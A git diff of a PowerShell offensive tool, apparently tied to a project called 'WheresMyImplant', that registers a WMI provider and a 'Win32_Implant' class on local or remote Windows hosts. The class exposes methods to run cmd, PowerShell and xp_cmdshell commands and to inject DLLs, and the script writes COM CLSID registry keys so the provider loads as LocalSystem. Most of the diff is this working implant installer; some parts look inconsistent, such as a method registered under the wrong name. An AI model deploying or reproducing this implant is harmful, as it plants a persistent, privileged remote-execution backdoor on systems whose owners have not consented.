@@ -273,15 +273,15 @@ Function Install-WMIProviderExtention {
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
-            [string]$Target = ".",
-        #[Parameter(Mandatory=$true, HelpMessage=".")]
-        #    [string]$Provider,
+            [string]$ComputerName = ".",
         [Parameter(Mandatory=$false, HelpMessage=".")]
             [string]$Username,
         [Parameter(Mandatory=$false, HelpMessage=".")]
             [string]$Password,
         [Parameter(Mandatory=$false, HelpMessage=".")]
             [SecureString]$SecurePassword,
+        [Parameter(Mandatory=$false, HelpMessage=".")]
+            [SecureString]$Credential,
         [Parameter(Mandatory=$true, HelpMessage=".")]
             [string]$ClassName,
         [Parameter(Mandatory=$false, HelpMessage=".")]
@@ -289,12 +289,16 @@ Function Install-WMIProviderExtention {
             [string]$CLRVersion,
         [Parameter(Mandatory=$false, HelpMessage=".")]
             [string]$PublicKeyToken,
+        [Parameter(Mandatory=$false, HelpMessage=".")]
+            [string]$uri = "file:///",
         [Parameter(Mandatory=$true, HelpMessage=".")]
             [string]$LibraryLocation = "$env:windir\system32\wbem\$ClassName.dll"
     )
     Begin {
+        $ConnectionOptions = New-Object System.Management.ConnectionOptions;
         if ($Username)
         {
+            Write-Verbose "Authenticating as $Username"
             if ($Password)
             {
                 [SecureString]$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
@@ -304,20 +308,244 @@ Function Install-WMIProviderExtention {
         }
         else
         {
+            Write-Verbose "Authenticating as $env:USERNAME"
             $ConnectionOptions.Impersonation = [System.Management.ImpersonationLevel]::Impersonate;
         }
+        ################################################################################
+        $Guid = [System.Guid]::NewGuid()
+        Write-Verbose "Using GUID $Guid"
         $Scope = New-Object System.Management.ManagementScope("\\$Target\root\cimv2", $ConnectionOptions);
-        $Class = New-Object System.Management.ManagementClass($Scope, "__Win32Provider", $null);
-    
+        ################################################################################
+        Write-Verbose "Creating WMI_extention"
+        $__Win32Provider = New-Object System.Management.ManagementClass($Scope, "__Win32Provider", $null); 
+        $WMI_extention = $__Win32Provider.Derive("WMI_extention")   
+        $WMI_extention.Properties['Version'].Value = 1
+        $WMI_extention.Properties['ClsId'].Value = "{" + $Guid.Guid + "}"
+        $WMI_extention.Properties['HostingModel'].Value = "Decoupled:COM"
+        $WMI_extention.Properties.Add("AssemblyName", [System.Management.CimType]::String, $false)
+        $WMI_extention.Properties.Add("AssemblyPath", [System.Management.CimType]::String, $false)
+        $WMI_extention.Properties.Add("CLRVersion", [System.Management.CimType]::String, $false)
+        $null = $WMI_extention.put()
+        ################################################################################
+        Write-Verbose "Creating WMI_extention $ClassName Instance"
+        $Provider = "$ClassName, Version=1.0.0.0, Culture=neutral, PublicKeyToken=$PublicKeyToken";
+        $WMI_extention_instance = Set-WmiInstance -Class WMI_extention -Arguments @{
+            AssemblyName = $Provider;
+            AssemblyPath = $uri + $($LibraryLocation -replace "\\","/");
+            CLRVersion   = $CLRVersion;
+            CLSID        = "{" + $Guid.Guid + "}"
+            HostingModel = "LocalSystemHost:CLR";
+            Name         = $Provider;
+        } -ComputerName $ComputerName
+        ################################################################################
+        Write-Verbose "Registering $ClassName as an Instance Provider"
+        $__InstanceProviderRegistration = Set-WmiInstance -Class __InstanceProviderRegistration -Arguments @{
+            Provider = $WMI_extention_instance;
+            SupportsGet = "TRUE";
+            SupportsPut = "TRUE";
+            SupportsDelete = "TRUE";
+            SupportsEnumeration = "TRUE";
+        } -ComputerName $ComputerName 
+        ################################################################################
+        Write-Verbose "Registering $ClassName as a Method Provider"
+        $__MethodProviderRegistration = Set-WmiInstance -Class __MethodProviderRegistration -Arguments @{
+            Provider = $WMI_extention_instance;
+        } -ComputerName $ComputerName 
+        ################################################################################
     } Process {
-        $Class.Properties.Add("AssemblyName", "$ClassName, Version=1.0.0.0, Culture=neutral, PublicKeyToken=$PublicKeyToken")
-        $Class.Properties.Add("AssemblyPath", "file:///$($LibraryLocation -replace "\\","/")")
-        $Class.Properties.Add("CLRVersion", $CLRVersion)
-        $Class.Properties.Add("HostingModel", "LocalSystemHost:CLR")
-        $Class.Properties.Add("Name", "$ClassName, Version=1.0.0.0, Culture=neutral, PublicKeyToken=$PublicKeyToken")
-    } End { 
-        $Class.Put()
+        Write-Verbose "Registering Win32_Implant"
+        $Class = New-Object System.Management.ManagementClass($Scope, [String]::Empty, $null)
+        $Class['__class'] = "Win32_Implant"
+        $Class.Qualifiers.Add("dynamic", $true, $false, $true, $false, $true)
+        $Class.Qualifiers.Add("provider", $Provider, $false, $true, $false, $true)
+
+        
+        $Class = Add-WMIMethodRunCMD -Class $Class
+        $Class = Add-WMIMethodRunPowerShell -Class $Class
+        $Class = Add-WMIMethodRunXpCmdShell -Class $Class
+        $Class = Add-WMIMethodInjectDll -Class $Class
+        
+        $null = $Class.put()
+        Write-Verbose "Testing installation"
+        Invoke-WmiMethod -Class Win32_Implant -Name RunPowerShell -ArgumentList "whoami"
+
+        Get-CimClass Win32_Implant
+        <#
+        Remove-WmiObject -InputObject $WMI_extention_instance
+        Remove-WmiObject -InputObject $__InstanceProviderRegistration
+        Remove-WmiObject -InputObject $__MethodProviderRegistration
+        Remove-WmiObject -InputObject $Class
+        #>
+    } End {
+        $keys = @()
+        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","","System.Management.Instrumentation.ManagedCommonProvider"
+
+        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}\InprocServer32"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","","C:\Windows\System32\mscoree.dll"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","ThreadingModel","Both"
+
+        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}\InprocServer32\"+$CLRVersion
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","",""
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion
+
+
+        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","","System.Management.Instrumentation.ManagedCommonProvider"
+
+        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}\InprocServer32"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","","C:\Windows\System32\mscoree.dll"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","ThreadingModel","Both"
+
+        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}\InprocServer32\"+$CLRVersion
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","",""
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483648", "\WOW6432Node\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion
+
+
+        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","","System.Management.Instrumentation.ManagedCommonProvider"
+
+        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}\InprocServer32"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","","C:\Windows\System32\mscoree.dll"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","ThreadingModel","Both"
+
+        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}\InprocServer32\"+$CLRVersion
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","",""
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion
+
+
+        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","","System.Management.Instrumentation.ManagedCommonProvider"
+
+        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}\InprocServer32"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","","C:\Windows\System32\mscoree.dll"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","ThreadingModel","Both"
+
+        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}\InprocServer32\"+$CLRVersion
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","",""
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\Classes\WOW6432Node\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion
+
+
+        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","","System.Management.Instrumentation.ManagedCommonProvider"
+
+        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}\InprocServer32"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","","C:\Windows\System32\mscoree.dll"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","ThreadingModel","Both"
+
+        Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}\InprocServer32\"+$CLRVersion
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","",""
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","Assembly","System.Management.Instrumentation, Version="+$CLRVersion+", Culture=neutral, PublicKeyToken="+$PublicKeyToken
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","Class","System.Management.Instrumentation.ManagedCommonProvider"
+        Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgumentList "2147483650", "\SOFTWARE\WOW6432Node\Classes\CLSID\{" + $Guid.Guid + "}","RuntimeVersion",$CLRVersion
+
+        <# 
+        Remove-WmiObject -Class "Win32_Implant"
+        Remove-WmiObject -Class "WMI_extention"
+        
+        $implant = Get-WmiObject -Class __MethodProviderRegistration | ? provider -like "*WheresMyImplant*"
+        Remove-WmiObject -InputObject $implant
+        
+        $implant = Get-WmiObject -Class __InstanceProviderRegistration | ? provider -like "*WheresMyImplant*"
+        Remove-WmiObject -InputObject $implant
+        #>
     }
+}
+
+################################################################################
+################################################################################
+Function Add-WMIMethodRunCMD {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
+            [System.Management.ManagementClass]$Class
+    )
+    $command = New-WMIMethodParameter -Direction In -Property command -CimType String
+    $parameters = New-WMIMethodParameter -Direction In -Property parameters -CimType String
+    $output = New-WMIMethodParameter -Direction Out -Property output -CimType String
+    return Add-WMIProviderClassMethod -Class $Class -MethodName "RunCMD" -MethodInParameters @($command, $parameters) -MethodOutParameters @($output)
+}
+
+################################################################################
+################################################################################
+Function Add-WMIMethodRunPowerShell {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
+            [System.Management.ManagementClass]$Class
+    )
+    $command = New-WMIMethodParameter -Direction In -Property command -CimType String
+    $output = New-WMIMethodParameter -Direction Out -Property output -CimType String
+    return Add-WMIProviderClassMethod -Class $Class -MethodName "RunPowerShell" -MethodInParameters @($command) -MethodOutParameters @($output)
+}
+
+################################################################################
+################################################################################
+Function Add-WMIMethodRunXpCmdShell {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
+            [System.Management.ManagementClass]$Class
+    )
+    $server = New-WMIMethodParameter -Direction In -Property server -CimType String
+    $database = New-WMIMethodParameter -Direction In -Property database -CimType String
+    $sqlusername = New-WMIMethodParameter -Direction In -Property username -CimType String
+    $sqlpassword = New-WMIMethodParameter -Direction In -Property password -CimType String
+    $command = New-WMIMethodParameter -Direction In -Property command -CimType String
+    $output = New-WMIMethodParameter -Direction Out -Property output -CimType String
+    return Add-WMIProviderClassMethod -Class $Class -MethodName "RunPowerShell" -MethodInParameters @($server, $database, $sqlusername, $sqlpassword, $command) -MethodOutParameters @($output)
+}
+
+################################################################################
+################################################################################
+Function Add-WMIMethodInjectDll {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
+            [System.Management.ManagementClass]$Class
+    )
+    $dllName = New-WMIMethodParameter -Direction In -Property dllName -CimType String
+    $process = New-WMIMethodParameter -Direction In -Property process -CimType String
+    $output = New-WMIMethodParameter -Direction Out -Property output -CimType String
+    return Add-WMIProviderClassMethod -Class $Class -MethodName "InjectDll" -MethodInParameters @($dllName, $process) -MethodOutParameters @($output)
+}
+
+################################################################################
+################################################################################
+Function Add-WMIMethodInjectDllRemote {
+    [CmdletBinding()]
+    Param(
+        [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
+            [System.Management.ManagementClass]$Class
+    )
+    $dllName = New-WMIMethodParameter -Direction In -Property dllName -CimType String
+    $process = New-WMIMethodParameter -Direction In -Property process -CimType String
+    $output = New-WMIMethodParameter -Direction Out -Property output -CimType String
+    return Add-WMIProviderClassMethod -Class $Class -MethodName InjectDll -MethodInParameters @($dllName, $process) -MethodOutParameters @($output)
+
 }
 
 ################################################################################
@@ -346,7 +574,7 @@ Function local:Add-WMIProviderClassMethod {
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$True, HelpMessage="Class to add method to.")] 
-            [Object][ref]$Class,
+            [System.Management.ManagementClass]$Class,
         [Parameter(Mandatory=$True, HelpMessage="Method to add.")] 
             [String]$MethodName,
         [Parameter(Mandatory=$True, HelpMessage=".")] 
@@ -359,13 +587,10 @@ Function local:Add-WMIProviderClassMethod {
         $OutParameters = New-Parameters -Direction Out
     } Process {
         $Index = 0
-        $MethodInParameters | ft
         $MethodInParameters | ForEach-Object {
-            $_ | ft
             Add-WMIProviderClassProperty -Parameters ([ref] $InParameters) -Direction $_.Direction -Index $Index -Property $_.Property -CimType $_.CimType
             $Index++
         }
-        
         $MethodOutParameters | ForEach-Object {
             Add-WMIProviderClassProperty -Parameters ([ref] $OutParameters) -Direction $_.Direction -Index $Index -Property $_.Property -CimType $_.CimType
             $Index++
@@ -373,7 +598,8 @@ Function local:Add-WMIProviderClassMethod {
     } End {
        $InParametersManagementBaseObjectInstance = Get-ManagementBaseObject -Parameter $InParameters
        $OutParametersManagementBaseObjectInstance = Get-ManagementBaseObject -Parameter $OutParameters
-       $Class.Methods.Add($MethodName, $InParametersManagementBaseObjectInstance, $OutParametersManagementBaseObjectInstance)
+       $null = $Class.Methods.Add($MethodName, $InParametersManagementBaseObjectInstance, $OutParametersManagementBaseObjectInstance)
+       Write-Output $Class
     }
 }
 
@@ -425,7 +651,6 @@ Function local:New-WMIProviderClass {
         [Parameter(Mandatory=$false, HelpMessage=".")]
             [switch]$Dynamic
     )
-    $Target = "."
     $ConnectionOptions = New-Object System.Management.ConnectionOptions;
     if ($Username)
     {
@@ -506,10 +731,12 @@ Function local:Get-ManagementBaseObject {
 Function local:Invoke-ProviderSetup {
     [CmdletBinding()]
     Param(
+        [Parameter(Mandatory=$false, HelpMessage=".")] 
+            [String]$Provider = "WMI_extention",
         [Parameter(Mandatory=$True, HelpMessage=".")] 
             [Object]$Class,
         [Parameter(Mandatory=$True, HelpMessage=".")]
-            [ValidateSet ("NetworkServiceHost", "LocalSystemHostOrSelfHost", "LocalSystemHost")] 
+            [ValidateSet ("NetworkServiceHost", "LocalSystemHostOrSelfHost", "LocalSystemHost", "Decoupled:COM")] 
             [String]$HostingModel = "NetworkServiceHost"
     )
 
@@ -520,7 +747,7 @@ Function local:Invoke-ProviderSetup {
         ClsId = "{$Guid}";
         ImpersonationLevel = 1;
         PerUserInitialization = "FALSE";
-        HostingModel = "NetworkServiceHost";
+        HostingModel = $HostingModel;
     };
 
     $__InstanceProviderRegistration = Set-WmiInstance -Class __InstanceProviderRegistration -Arguments @{
@@ -553,8 +780,8 @@ Function local:New-WMIFSClass {
     Param(
         [Parameter(Mandatory=$false, HelpMessage="Name of Class to Create.")]
             [string]$ClassName = 'WMIFS',
-        [Parameter(Mandatory=$true, HelpMessage="System to run against.")]
-            [string]$Target,
+        [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
+            [string]$Target=".",
         [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
             [string]$Username,
         [Parameter(Mandatory=$false, HelpMessage="System to run against.")]
@@ -563,7 +790,25 @@ Function local:New-WMIFSClass {
             [SecureString]$SecurePassword
     )
     Begin {
-        $Class = New-WMIClass -ClassName WMIFS -Target $Target -Username $Username -Password $Password -SecurePassword $SecurePassword
+        $ConnectionOptions = New-Object System.Management.ConnectionOptions;
+        if ($Username)
+        {
+            Write-Verbose "Authenticating as $Username"
+            if ($Password)
+            {
+                [SecureString]$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
+            } 
+            $ConnectionOptions.Username = $Username
+            $ConnectionOptions.SecurePassword = [SecureString]$SecurePassword
+        }
+        else
+        {
+            Write-Verbose "Authenticating as $env:USERNAME"
+            $ConnectionOptions.Impersonation = [System.Management.ImpersonationLevel]::Impersonate;
+        }
+
+        $Scope = New-Object System.Management.ManagementScope("\\$Target\root\cimv2", $ConnectionOptions);
+        $Class = New-Object System.Management.ManagementClass($Scope, [String]::Empty, $null);   
     } Process {
         $Class["__CLASS"] = $ClassName; 
 
